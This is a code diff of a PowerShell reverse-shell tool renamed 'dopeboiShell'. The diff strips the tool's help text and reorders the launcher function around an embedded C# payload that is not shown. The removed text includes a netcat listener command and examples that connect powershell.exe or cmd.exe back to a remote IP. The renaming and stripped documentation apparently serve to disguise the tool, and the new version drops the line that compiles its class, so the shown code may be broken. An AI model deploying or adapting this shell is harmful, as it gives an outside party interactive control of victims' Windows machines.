@@ -1,119 +1,3 @@
-function Invoke-dopeboiShell
-{   
-    <#
-        .SYNOPSIS
-            dopeboiShell - Fully Interactive Reverse Shell for Windows 
-            Author: splinter_code
-            License: MIT
-            Source: https://github.com/antonioCoco/dopeboiShell
-        
-        .DESCRIPTION
-            dopeboiShell - Fully interactive reverse shell for Windows
-            
-            Properly set the rows and cols values. You can retrieve it from
-            your terminal with the command "stty size".
-            
-            You can avoid to set rows and cols values if you run your listener
-            with the following command:
-                stty raw -echo; (stty size; cat) | nc -lvnp 3001
-           
-            If you want to change the console size directly from powershell
-            you can paste the following commands:
-                $width=80
-                $height=24
-                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
-                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
-            
-            
-        .PARAMETER RemoteIp
-            The remote ip to connect
-        .PARAMETER RemotePort
-            The remote port to connect
-        .PARAMETER Rows
-            Rows size for the console
-            Default: "24"
-        .PARAMETER Cols
-            Cols size for the console
-            Default: "80"
-        .PARAMETER CommandLine
-            The commandline of the process that you are going to interact
-            Default: "powershell.exe"
-            
-        .EXAMPLE  
-            PS>Invoke-dopeboiShell 10.0.0.2 3001
-            
-            Description
-            -----------
-            Spawn a reverse shell
-
-        .EXAMPLE
-            PS>Invoke-dopeboiShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
-            
-            Description
-            -----------
-            Spawn a reverse shell with specific rows and cols size
-            
-         .EXAMPLE
-            PS>Invoke-dopeboiShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
-            
-            Description
-            -----------
-            Spawn a reverse shell (cmd.exe) with specific rows and cols size
-            
-        .EXAMPLE
-            PS>Invoke-dopeboiShell -Upgrade -Rows 30 -Cols 90
-            
-            Description
-            -----------
-            Upgrade your current shell with specific rows and cols size
-            
-    #>
-    Param
-    (
-        [Parameter(Position = 0)]
-        [String]
-        $RemoteIp,
-        
-        [Parameter(Position = 1)]
-        [String]
-        $RemotePort,
-
-        [Parameter()]
-        [String]
-        $Rows = "24",
-
-        [Parameter()]
-        [String]
-        $Cols = "80",
-
-        [Parameter()]
-        [String]
-        $CommandLine = "powershell.exe",
-        
-        [Parameter()]
-        [Switch]
-        $Upgrade
-    )
-    
-    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
-        $RemoteIp = "upgrade"
-        $RemotePort = "shell"
-    }
-    else{
-  
-        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
-            throw "RemoteIp missing parameter"
-        }
-        
-        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
-            throw "RemotePort missing parameter"
-        }
-    }
-    $parametersdopeboiShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
-    Add-Type -TypeDefinition $Source -Language CSharp;
-    $output = [dopeboiShellMainClass]::dopeboiShellMain($parametersdopeboiShell)
-    Write-Output $output
-}
 
 $Source = @"
 
@@ -1714,3 +1598,51 @@ class MainClass
 
 "@;
 
+function Invoke-dopeboiShell
+{   
+ 
+    Param
+    (
+        [Parameter(Position = 0)]
+        [String]
+        $RemoteIp,
+        
+        [Parameter(Position = 1)]
+        [String]
+        $RemotePort,
+
+        [Parameter()]
+        [String]
+        $Rows = "24",
+
+        [Parameter()]
+        [String]
+        $Cols = "80",
+
+        [Parameter()]
+        [String]
+        $CommandLine = "powershell.exe",
+        
+        [Parameter()]
+        [Switch]
+        $Upgrade
+    )
+    
+    if( $PSBoundParameters.ContainsKey('Upgrade') ) {
+        $RemoteIp = "upgrade"
+        $RemotePort = "shell"
+    }
+    else{
+  
+        if(-Not($PSBoundParameters.ContainsKey('RemoteIp'))) {
+            throw "RemoteIp missing parameter"
+        }
+        
+        if(-Not($PSBoundParameters.ContainsKey('RemotePort'))) {
+            throw "RemotePort missing parameter"
+        }
+    }
+    $parametersdopeboiShell = @($RemoteIp, $RemotePort, $Rows, $Cols, $CommandLine)
+    $output = [dopeboiShellMainClass]::dopeboiShellMain($parametersdopeboiShell)
+    Write-Output $output
+}
